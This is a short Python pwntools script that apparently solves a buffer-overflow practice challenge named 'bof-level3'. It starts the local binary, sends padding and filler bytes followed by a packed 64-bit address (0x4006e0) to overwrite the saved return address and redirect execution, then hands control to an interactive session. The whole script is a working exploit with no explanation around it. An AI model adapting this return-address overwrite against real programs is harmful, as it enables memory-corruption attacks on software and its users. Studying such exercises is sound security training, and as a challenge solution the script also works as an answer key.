#!/usr/bin/env python

from pwn import *

p = process("./bof-level3")

p.recv()

p.send("A" * 32 + "ABCDEFGH" + "abcdefgh"  + "A" * 8 + p64(0x00000000004006e0) + "\n")

p.interactive()

